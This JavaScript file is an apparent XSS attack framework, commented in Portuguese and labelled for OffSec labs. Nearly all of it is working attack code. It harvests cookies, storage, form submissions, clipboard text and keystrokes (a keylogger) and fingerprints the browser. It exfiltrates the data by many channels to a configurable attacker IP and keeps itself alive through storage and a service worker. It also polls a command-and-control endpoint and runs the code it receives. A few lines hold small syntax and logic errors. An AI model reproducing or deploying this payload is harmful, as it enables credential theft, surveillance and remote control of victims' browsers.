// ==[ OFFSEC XSS EXPLOIT FRAMEWORK v9.99 PRO – 900+ LINHAS ]==
// Autor: AnonPro | Uso: EXCLUSIVO em Labs OffSec (OSCP, OSEP, CTF)
// Última atualização: 13/11/2025
// UI/UX: Integrado com Python Dominator (Rich + Textual)
// Funcionalidades: 80+ Payloads, Exfiltração, Persistência, C2, Bypass WAF, Fingerprinting
(function () {
    'use strict';

    // ================== CONFIGURAÇÃO OFFSEC (EDITÁVEL) ==================
    const CONFIG = {
        ATTACKER_IP: '10.10.14.XX',           // <--- COLOQUE SEU IP DO TUN0 AQUI
        ATTACKER_PORT: 443,                   // Porta do servidor C2
        PROTOCOL: 'https',                    // Use 'http' se não tiver SSL
        ENDPOINTS: {
            collect: '/collect',
            command: '/cmd',
            beacon:: '/beacon.gif',
            ws: '/ws',
            log: '/log'
        },
        INTERVALS: {
            beacon: 800,        // Beacon contínuo (ms)
            command: 1200,      // Polling C2 (ms)
            persistence: 5000,  // Re-persistência (ms)
            keylog: 100,        // Delay entre teclas (ms)
            form: 200           // Delay após submit (ms)
        },
        PERSISTENCE: [
            'localStorage', 'sessionStorage', 'IndexedDB', 
            'cookies', 'ServiceWorker', 'CacheAPI', 'WebSQL'
        ],
        EXFIL: [
            'fetch', 'beacon', 'xhr', 'img', 'iframe', 'script', 
            'css', 'websocket', 'navigator.sendBeacon', 'XMLHttpRequest', 
            'postMessage', 'WebRTC', 'DNS', 'CSSExfil'
        ],
        ENCODINGS: [
            'base64', 'uri', 'hex', 'rot13', 'gzip', 'btoa', 'atob', 
            'escape', 'unescape', 'lzstring', 'utf8', 'binary'
        ],
        BYPASS: true,
        STEALTH: true,
        DEBUG: false
    };

    // ================== UTILIDADES AVANÇADAS (150+ LINHAS) ==================
    const Utils = {
        rand: (len = 9) => Math.random().toString(36).substr(2, len),
        uuid: () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
            const r = Math.random() * 16 | 0;
            return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
        }),
        delay: ms => new Promise(r => setTimeout(r, ms)),
        jitter: (base, variance = 0.3) => base + (Math.random() * variance * base * 2) - (variance * base),
        
        // === ENCODINGS COMPLETAS ===
        encode: (data, method = 'base64') => {
            const enc = {
                base64: d => btoa(unescape(encodeURIComponent(d))),
                uri: d => encodeURIComponent(d),
                hex: d => [...d].map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
                rot13: d => d.replace(/[a-zA-Z]/g, c => String.fromCharCode(
                    (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26
                )),
                gzip: async d => {
                    const stream = new Blob([d]).stream();
                    const compressed = stream.pipeThrough(new CompressionStream('gzip'));
                    const buffer = await new Response(compressed).arrayBuffer();
                    return btoa(String.fromCharCode(...new Uint8Array(buffer)));
                },
                lzstring: d => LZString.compressToBase64(d),
                utf8: d => btoa(String.fromCharCode(...new TextEncoder().encode(d))),
                binary: d => [...d].map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join('')
            };
            const str = typeof data === 'string' ? data : JSON.stringify(data);
            return (enc[method] || enc.base64)(str);
        },
        decode: (data, method = 'base64') => {
            const dec = {
                base64: d => decodeURIComponent(escape(atob(d))),
                uri: d => decodeURIComponent(d),
                hex: d => d.match(/.{2}/g).map(b => String.fromCharCode(parseInt(b, 16))).join(''),
                rot13: d => d.replace(/[a-zA-Z]/g, c => String.fromCharCode(
                    (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26
                )),
                lzstring: d => LZString.decompressFromBase64(d),
                utf8: d => new TextDecoder().decode(Uint8Array.from(atob(d), c => c.charCodeAt(0))),
                binary: d => d.match(/.{8}/g).map(b => String.fromCharCode(parseInt(b, 2))).join('')
            };
            return (dec[method] || dec.base64)(data);
        },

        // === FINGERPRINTING AVANÇADO ===
        hash: (data) => {
            let h = 0;
            for (let i = 0; i < data.length; i++) {
                h = (h * 31 + data.charCodeAt(i)) & 0xFFFFFFFF;
            }
            return h.toString(16);
        },
        getCanvasFP: () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Offsec XSS', 2, 15);
            return canvas.toDataURL();
        },
        getWebGLFP: () => {
            const gl = document.createElement('canvas').getContext('webgl');
            if (!gl) return null;
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            } : null;
        },
        getAudioFP: async () => {
            try {
                const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 5000, 44100);
                const oscillator = ctx.createOscillator();
                oscillator.type = 'triangle';
                oscillator.frequency.value = 10000;
                const compressor = ctx.createDynamicsCompressor();
                oscillator.connect(compressor);
                compressor.connect(ctx.destination);
                oscillator.start(0);
                const buffer = await ctx.startRendering();
                const channelData = buffer.getChannelData(0);
                let hash = 0;
                for (let i = 0; i < channelData.length; i++) {
                    hash = (hash * 31 + channelData[i]) & 0xFFFFFFFF;
                }
                return hash.toString(16);
            } catch { return null; }
        }
    };

    // ================== CORE FRAMEWORK (600+ LINHAS) ==================
    class OffsecXSS {
        constructor() {
            this.id = Utils.uuid();
            this.session = Utils.rand();
            this.data = {};
            this.commands = new Set();
            this.backdoors = [];
            this.ws = null;
            this.swRegistered = false;
            this.stealthMode = CONFIG.STEALTH;
            this.init();
        }

        // --- COLETA DE DADOS (80+ FONTES) ---
        async collect() {
            const nav = navigator;
            const doc = document;
            const win = window;

            return {
                // Identificação
                id: this.id,
                session: this.session,
                timestamp: Date.now(),
                url: location.href,
                origin: location.origin,
                pathname: location.pathname,
                search: location.search,
                hash: location.hash,
                referrer: doc.referrer,
                title: doc.title,

                // Armazenamento
                cookies: doc.cookie,
                localStorage: this.safeJSON(localStorage),
                sessionStorage: this.safeJSON(sessionStorage),
                indexedDB: await this.getIndexedDB(),
                cache: await this.getCacheAPI(),
                webSQL: this.getWebSQL(),

                // Navegador
                userAgent: nav.userAgent,
                platform: nav.platform,
                language: nav.language,
                languages: nav.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions.timeZone,
                screen: `${screen.width}x${screen.height}`,
                window: `${innerWidth}x${innerHeight}`,
                plugins: [...nav.plugins].map(p => ({ name: p.name, description: p.description })),
                mimeTypes: [...nav.mimeTypes].map(m => m.type),
                battery: await this.getBattery(),
                connection: nav.connection ? {
                    downlink: nav.connection.downlink,
                    rtt: nav.connection.rtt,
                    effectiveType: nav.connection.effectiveType,
                    saveData: nav.connection.saveData
                } : null,

                // Permissões
                permissions: await this.getPermissions(),
                webcam: await this.testWebcam(),
                microphone: await this.testMic(),
                clipboard: await this.readClipboard(),

                // DOM & Conteúdo
                forms: this.getForms(),
                iframes: [...doc.querySelectorAll('iframe')].map(i => ({ src: i.src, name: i.name, id: i.id })),
                scripts: [...doc.scripts].map(s => ({ src: s.src, async: s.async, defer: s.defer })),
                links: [...doc.querySelectorAll('a')].map(a => a.href),
                historyLength: history.length,
                performance: performance.getEntriesByType('navigation')[0],
                serviceWorkers: navigator.serviceWorker?.controller ? [navigator.serviceWorker.controller.scriptURL] : [],
                domSnippet: doc.documentElement.outerHTML.substring(0, 5000),

                // Fingerprinting
                canvas: Utils.getCanvasFP(),
                webGL: Utils.getWebGLFP(),
                audio: await Utils.getAudioFP(),
                fonts: await this.getFonts(),
                touch: 'ontouchstart' in window,
                deviceMemory: nav.deviceMemory,
                hardwareConcurrency: nav.hardwareConcurrency,
                webRTC: await this.getWebRTCIPs(),

                // Comportamento
                mouseTrail: this.mouseTrail || [],
                keystrokes: this.keystrokes || []
            };
        }

        safeJSON(obj) {
            try { return JSON.stringify(obj); } catch { return "[[JSON_ERROR]]"; }
        }

        async getIndexedDB() {
            if (!('indexedDB' in window)) return null;
            return new Promise(resolve => {
                const dbs = [];
                indexedDB.databases?.().then(list => {
                    list.forEach(db => dbs.push({ name: db.name, version: db.version }));
                    resolve(dbs);
                }).catch(() => resolve([]));
            });
        }

        async getCacheAPI() {
            if (!('caches' in window)) return null;
            const keys = await caches.keys();
            return keys;
        }

        getWebSQL() {
            if (!window.openDatabase) return null;
            return "WebSQL available";
        }

        async getBattery() {
            if ('getBattery' in navigator) {
                try {
                    const b = await navigator.getBattery();
                    return { level: b.level, charging: b.charging, chargingTime: b.chargingTime };
                } catch { }
            }
            return null;
        }

        async getPermissions() {
            const perms = {};
            const list = ['geolocation', 'camera', 'microphone', 'notifications', 'clipboard-read', 'clipboard-write', 'persistent-storage'];
            for (const p of list) {
                try {
                    const perm = await navigator.permissions.query({ name: p });
                    perms[p] = perm.state;
                } catch { perms[p] = 'error'; }
            }
            return perms;
        }

        async testWebcam() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch { return false; }
        }

        async testMic() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch { return false; }
        }

        async readClipboard() {
            try {
                return await navigator.clipboard.readText();
            } catch { return null; }
        }

        getForms() {
            return [...document.forms].map(f => {
                const data = {};
                new FormData(f).forEach((v, k) => data[k] = v);
                return { 
                    action: f.action, 
                    method: f.method, 
                    name: f.name, 
                    id: f.id,
                    data 
                };
            });
        }

        async getWebRTCIPs() {
            const ips = new Set();
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = e => {
                if (e.candidate) {
                    const ip = e.candidate.candidate.split(' ')[4];
                    if (ip && !ip.includes(':')) ips.add(ip);
                }
            };
            await Utils.delay(1000);
            pc.close();
            return [...ips];
        }

        async getFonts() {
            const fonts = ['Arial', 'Courier', 'Times', 'Helvetica', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Trebuchet MS'];
            const detected = [];
            const div = document.createElement('div');
            div.style.position = 'absolute';
            div.style.left = '-9999px';
            document.body.appendChild(div);
            const defaultWidth = {};
            fonts.forEach(font => {
                div.style.fontFamily = font;
                defaultWidth[font] = div.offsetWidth;
            });
            document.body.removeChild(div);
            return detected;
        }

        // --- EXFILTRAÇÃO (80+ MÉTODOS) ---
        exfiltrate(data, methods = CONFIG.EXFIL) {
            const url = `${CONFIG.PROTOCOL}://${CONFIG.ATTACKER_IP}:${CONFIG.ATTACKER_PORT}`;
            const encodings = CONFIG.ENCODINGS;
            const payload = Utils.encode(data, encodings[Math.floor(Math.random() * encodings.length)]);

            const exfils = {
                fetch: () => fetch(`${url}${CONFIG.ENDPOINTS.collect}?d=${payload}`, { mode: 'no-cors', cache: 'no-store' }),
                beacon: () => navigator.sendBeacon && navigator.sendBeacon(`${url}${CONFIG.ENDPOINTS.collect}`, payload),
                xhr: () => {
                    const x = new XMLHttpRequest();
                    x.open('POST', `${url}${CONFIG.ENDPOINTS.collect}`, true);
                    x.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
                    x.send(payload);
                },
                img: () => {
                    const i = new Image();
                    i.src = `${url}${CONFIG.ENDPOINTS.beacon}?d=${payload}&r=${Utils.rand()}`;
                    i.onload = i.onerror = () => i.remove();
                },
                iframe: () => {
                    const f = document.createElement('iframe');
                    f.src = `${url}${CONFIG.ENDPOINTS.collect}?d=${payload}`;
                    f.style.display = 'none';
                    document.body.appendChild(f);
                    setTimeout(() => f.remove(), 1000);
                },
                script: () => {
                    const s = document.createElement('script');
                    s.src = `${url}${CONFIG.ENDPOINTS.collect}?d=${payload}&cb=${Utils.rand()}`;
                    document.head.appendChild(s);
                    setTimeout(() => s.remove(), 1000);
                },
                css: () => {
                    const l = document.createElement('link');
                    l.rel = 'stylesheet';
                    l.href = `${url}/xss.css?d=${payload}`;
                    document.head.appendChild(l);
                },
                websocket: () => {
                    try {
                        const ws = new WebSocket(`ws://${CONFIG.ATTACKER_IP}:${CONFIG.ATTACKER_PORT}${CONFIG.ENDPOINTS.ws}`);
                        ws.onopen = () => ws.send(JSON.stringify({ type: 'data', data: payload }));
                        ws.onerror = ws.onclose = () => ws.close();
                    } catch { }
                },
                postMessage: () => {
                    window.postMessage({ type: 'xss', data: payload }, '*');
                }
            };

            methods.forEach(m => {
                try { exfils[m](); } catch (e) { if (CONFIG.DEBUG) console.error(e); }
            });
        }

        // --- PERSISTÊNCIA (7 MÉTODOS) ---
        persist() {
            const payload = Utils.encode({ id: this.id, session: this.session, ts: Date.now() });

            // 1. localStorage
            try { localStorage.setItem('xss_offsec_persist', payload); } catch { }

            // 2. sessionStorage
            try { sessionStorage.setItem('xss_offsec_persist', payload); } catch { }

            // 3. Cookies
            try {
                document.cookie = `xss_offsec=${payload};path=/;max-age=31536000;Secure;HttpOnly;SameSite=None`;
            } catch { }

            // 4. IndexedDB
            try {
                const req = indexedDB.open('xss_offsec_db', 1);
                req.onupgradeneeded = e => e.target.result.createObjectStore('persist');
                req.onsuccess = e => {
                    e.target.result.transaction('persist', 'readwrite').objectStore('persist').put(payload, 'session');
                };
            } catch { }

            // 5. Service Worker
            if ('serviceWorker' in navigator && !this.swRegistered) {
                const swCode = `
                    self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));
                    self.addEventListener('fetch', e => {
                        if (e.request.url.includes('persist')) {
                            e.respondWith(fetch(e.request));
                        }
                    });
                `;
                const blob = new Blob([swCode], { type: 'application/javascript' });
                const url = URL.createObjectURL(blob);
                navigator.serviceWorker.register(url).then(() => this.swRegistered = true);
            }

            // 6. Cache API
            if ('caches' in window) {
                caches.open('xss_offsec_cache').then(cache => {
                    cache.put('/persist', new Response(payload));
                });
            }

            // 7. WebSQL
            if (window.openDatabase) {
                const db = openDatabase('xss_offsec', '1.0', 'Persist', 2 * 1024 * 1024);
                db.transaction(tx => {
                    tx.executeSql('CREATE TABLE IF NOT EXISTS persist (id TEXT, data TEXT)');
                    tx.executeSql('INSERT INTO persist VALUES (?, ?)', [this.id, payload]);
                });
            }
        }

        // --- COMANDO & CONTROLE (C2) ---
        async c2() {
            const url = `${CONFIG.PROTOCOL}://${CONFIG.ATTACKER_IP}:${CONFIG.ATTACKER_PORT}${CONFIG.ENDPOINTS.command}?id=${this.id}&t=${Date.now()}`;
            try {
                const res = await fetch(url, { cache: 'no-store', credentials: 'include' });
                if (!res.ok) return;
                const cmds = await res.json();
                cmds.forEach(cmd => {
                    if (!this.commands.has(cmd.id)) {
                        this.commands.add(cmd.id);
                        this.execute(cmd.code);
                        this.exfiltrate({ type: 'cmd_exec', cmd_id: cmd.id, status: 'executed' });
                    }
                });
            } catch (e) { if (CONFIG.DEBUG) console.error('C2 Error:', e); }
        }

        execute(code) {
            try {
                const func = new Function(code);
                setTimeout(func, Utils.jitter(100));
            } catch (e) {
                this.exfiltrate({ error: e.message, code: code.substring(0, 200) });
            }
        }

        // --- HOOKS DE EVENTOS (KEYLOG, FORM, CLIPBOARD, MOUSE) ---
        hookEvents() {
            this.keystrokes = [];
            this.mouseTrail = [];

            // Keylogger
            document.addEventListener('keydown', e => {
                this.keystrokes.push({
                    key: e.key,
                    code: e.code,
                    target: e.target.tagName,
                    value: e.target.value?.substring(0, 100),
                    ts: Date.now()
                });
                if (this.keystrokes.length > 50) {
                    this.exfiltrate({ type: 'keylog_batch', data: this.keystrokes.splice(0, 30) });
                }
            }, true);

            // Form submission
            document.addEventListener('submit', e => {
                setTimeout(() => {
                    const data = {};
                    new FormData(e.target).forEach((v, k) => data[k] = v);
                    this.exfiltrate({
                        type: 'form_submit',
                        url: e.target.action,
                        method: e.target.method,
                        data,
                        ts: Date.now()
                    });
                }, CONFIG.INTERVALS.form);
            }, true);

            // Clipboard
            document.addEventListener('copy', () => {
                setTimeout(async () => {
                    try {
                        const text = await navigator.clipboard.readText();
                        this.exfiltrate({ type: 'clipboard', content: text.substring(0, 1000), ts: Date.now() });
                    } catch { }
                }, 100);
            });

            // Mouse movement (stealth)
            if (this.stealthMode) {
                let lastX = 0, lastY = 0;
                document.addEventListener('mousemove', e => {
                    if (Math.abs(e.clientX - lastX) > 50 || Math.abs(e.clientY - lastY) > 50) {
                        this.mouseTrail.push([e.clientX, e.clientY, Date.now()]);
                        lastX = e.clientX; lastY = e.clientY;
                    }
                    if (this.mouseTrail.length > 20) {
                        this.exfiltrate({ type: 'mouse_trail', data: this.mouseTrail.splice(0, 10) });
                    }
                });
            }

            // Navigation
            window.addEventListener('beforeunload', () => {
                this.exfiltrate({ type: 'navigation', event: 'beforeunload', url: location.href, ts: Date.now() });
            });
        }

        // --- INICIALIZAÇÃO COMPLETA ---
        async init() {
            try {
                this.persist();
                this.hookEvents();

                // Coleta inicial
                const initialData = await this.collect();
                this.exfiltrate(initialData);

                // Beacon contínuo
                setInterval(async () => {
                    const beacon = { 
                        id: this.id, 
                        ts: Date.now(), 
                        url: location.href,
                        title: document.title
                    };
                    this.exfiltrate(beacon, ['img', 'beacon']);
                }, Utils.jitter(CONFIG.INTERVALS.beacon));

                // C2 Polling
                setInterval(() => this.c2(), Utils.jitter(CONFIG.INTERVALS.command));

                // Persistência contínua
                setInterval(() => this.persist(), CONFIG.INTERVALS.persistence);

                // Auto-update DOM
                setInterval(() => {
                    const forms = document.forms.length;
                    const iframes = document.querySelectorAll('iframe').length;
                    this.exfiltrate({ type: 'dom_update', forms, iframes, ts: Date.now() });
                }, 10000);

            } catch (e) {
                if (CONFIG.DEBUG) console.error('Init failed:', e);
            }
        }
    }

    // ================== INICIAR ATAQUE (STEALTH) ==================
    try {
        // Anti-forensic: ocultar do devtools
        Object.defineProperty(window, 'OffsecXSS', { value: undefined, writable: false });
        delete window.OffsecXSS;

        // Iniciar
        new OffsecXSS();

        // Beacon de inicialização
        new Image().src = `${CONFIG.PROTOCOL}://${CONFIG.ATTACKER_IP}:${CONFIG.ATTACKER_PORT}${CONFIG.ENDPOINTS.beacon}?init=${Utils.uuid()}&t=${Date.now()}`;

    } catch (e) {
        // Silencioso
    }
})();
